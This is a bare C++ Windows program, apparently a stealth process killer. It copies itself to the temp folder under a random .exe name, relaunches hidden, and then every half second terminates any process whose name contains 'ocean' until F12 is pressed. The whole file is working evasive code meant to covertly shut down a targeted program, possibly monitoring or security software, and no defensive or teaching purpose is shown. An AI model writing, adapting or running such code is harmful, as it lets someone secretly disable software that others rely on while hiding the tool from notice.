#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <random>
#include <shlobj.h>

bool TerminateProcessesByName(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };
    if (Process32First(snapshot, &process)) {
        do {
            std::wstring currentProcessName = process.szExeFile;
            std::transform(currentProcessName.begin(), currentProcessName.end(), currentProcessName.begin(), ::towlower);
            std::wstring lowerKeyword = processName;
            std::transform(lowerKeyword.begin(), lowerKeyword.end(), lowerKeyword.begin(), ::towlower);

            if (currentProcessName.find(lowerKeyword) != std::wstring::npos) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, process.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return true;
}

std::wstring GenerateTempFilename(size_t length = 8) {
    const wchar_t characters[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::wstring filename;
    std::random_device randomDevice;
    std::mt19937 generator(randomDevice());
    std::uniform_int_distribution<> dist(0, 35);
    for (size_t i = 0; i < length; ++i) filename += characters[dist(generator)];
    return filename + L".exe";
}

bool IsLaunchedFromTemp() {
    wchar_t tempPath[MAX_PATH], currentExePath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);
    return wcsstr(currentExePath, tempPath) != nullptr;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (!IsLaunchedFromTemp()) {
        wchar_t currentExe[MAX_PATH];
        GetModuleFileNameW(NULL, currentExe, MAX_PATH);

        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);

        std::wstring newExePath = std::wstring(tempPath) + GenerateTempFilename();
        CopyFileW(currentExe, newExePath.c_str(), FALSE);
        ShellExecuteW(NULL, L"open", newExePath.c_str(), NULL, NULL, SW_HIDE);
        ExitProcess(0);
    }

    std::wstring processKeyword = L"ocean";

    while (true) {
        if (GetAsyncKeyState(VK_F12) & 1) break;
        TerminateProcessesByName(processKeyword);
        Sleep(500);
    }

    return 0;
}
